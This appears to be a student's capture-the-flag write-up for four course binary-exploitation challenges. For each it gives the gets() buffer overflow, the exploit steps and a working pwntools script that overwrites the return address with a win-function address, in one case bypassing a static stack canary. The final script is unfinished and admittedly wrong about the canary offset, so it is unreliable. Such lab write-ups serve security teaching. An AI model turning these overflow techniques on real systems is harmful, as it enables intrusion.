Re
===========================

See reverse engineered file for notes. 

Jump
===========================

General overview of problems faced
-------------------------------------
None.

List of vulnerabilities
--------------------
1. `gets(&buffer);` is used which will continue to read (and write) even if it overflows the 64 byte buffer

Steps to exploit
------------------
1. Find size of buffer using pwntools cyclic
2. Get the win function address from the output of the binary
3. Fill the 64 byte buffer and then overwrite the return address at the end with the address of the win function

Script/Command used
------------------
``` python
#!/usr/bin/env python3

from pwn import *

p = remote("6447.lol", 24224)

p.recvuntil(b"at ")
win_address = p.recvline().strip() # we read in the win address
win_address = int(win_address, 16) # and store it in an integer format

# payload = cyclic(200)

payload = b"A" * 72 # rax register was corrupted by 7016996846897815923, which by running `cyclic -l` returned an offset of 72
payload += p64(win_address) # insert win_address, overriding function pointer

p.sendlineafter(b"pointers work ?", payload)

p.interactive()
```

Blind
===========================

General overview of problems faced
-------------------------------------
No problems.

List of vulnerabilities
--------------------
1. Similar to JUMP, except win function can be retrieved from binary

Steps to exploit
------------------
1. Find size of buffer using pwntools cyclic
2. Get address of win function with `objdump -d blind` or using binary ninja
3. Fill buffer and write return addr at the end

Script/Command used
------------------
``` python
#!/usr/bin/env python3

from pwn import *

# p = process("./blind")
p = remote("6447.lol", 18496)

win_address = 0x401196  # replaced win address from the address of the win method from binary ninja
offset = 72

payload = b"A" * offset
payload += p64(win_address)

p.sendline(payload)
p.interactive()
```


Best Security
===========================

General overview of problems faced
-------------------------------------
Program seemed to end on EOF character despite printing win function, and also the incorrect canary message is still being printed - bypass overrides return address in incorrect canary if statement - probably an issue with correctly overriding the canary field. 

List of vulnerabilities
--------------------
Use of gets() in check_canary allows for buffer overflow. Also buf seems to serve no real purpose apart from allowing users to run an exploit.

Steps to exploit
------------------
1. Find size of buffer using pwntools cyclic
2. Read static canary from decompiler
3. print offset number of characters, followed by canary and win address to get shell access

Script/Command used
------------------
``` python
#!/usr/bin/env python3

from pwn import *

# p = process("./bestsecurity")
p = remote("6447.lol", 14860)

p.recvuntil(b"...\n")

win_address = 0x4011b6 
offset = 144 - 0x9 # offset from stack size (0x90) to canary (0x9)

payload = b"A" * offset
payload += b"12345678" # canary value (as seen on binary ninja)
payload += p64(win_address)

p.sendline(payload)
p.interactive()

```

Stack Dump
===========================

General overview of problems faced
-------------------------------------
Finding the canary was a challenge, I was not able to work out the offset correctly to read the canary memory field.

List of vulnerabilities
--------------------
Use of gets when reading length of entered string allows for buffer overflow. Also, program allows user to read arbitrary memory, which allows it to leak the canary.

Steps to exploit
------------------
1. Retrieve the stack pointer from the second line from the server 
2. Calculate the address of the canary by offseting stack pointer (could not work out correct offset)
3. Enter canary using 'input' option [i]
4. Read the canary from the memory dump option [d]
5. Select 'input' option [i] and enter offset number of bytes from buffer to canary in the length field, followed by canary and the address of the win function.
6. Select 'quit' option [q] and get shell access. 

Script/Command used
------------------
``` python
#!/usr/bin/env python3

from pwn import *
import re

p = process("./stack-dump")
# p = remote("6447.lol", 7139)

win_addr = 0x4012f6
offset = 96

reply = p.recvlines(2)	# starting lines
stack_ptr = re.search('0x(.{12})', str(reply[1])).group(0)
log.info("Stack pointer: %s" % (stack_ptr))
p.sendlineafter(b"[q]uit", b"i")
p.sendline(b"4")

stack_ptr = int(stack_ptr, 0) - 0x4
payload_leak = p64(stack_ptr)
p.sendline(payload_leak)
p.recvuntil(b"[q]uit\n")
p.recvuntil(b"[q]uit\n")
p.recvuntil(b"[q]uit\n")

p.sendline(b"d")
canary = p.recvline()
# canary = canary[22:26]
print(canary)
# # log.info("Canary: %s" % canary)
# p.recvlines(4)
p.interactive()


# p.sendline(b"i")
# p.sendline(bytes(size))
# p.sendline('A' * (0x71 - 0x4) + canary + '\xf6\x12\x40\x00' * 4)

# p.sendline(payload_return)
# p.recvlines(10)
# p.sendline(b"q")

# p.sendline(b"cat /flag")
# flag = p.recvline()
# log.success("Flag: %s" % (flag))
# p.close()
```


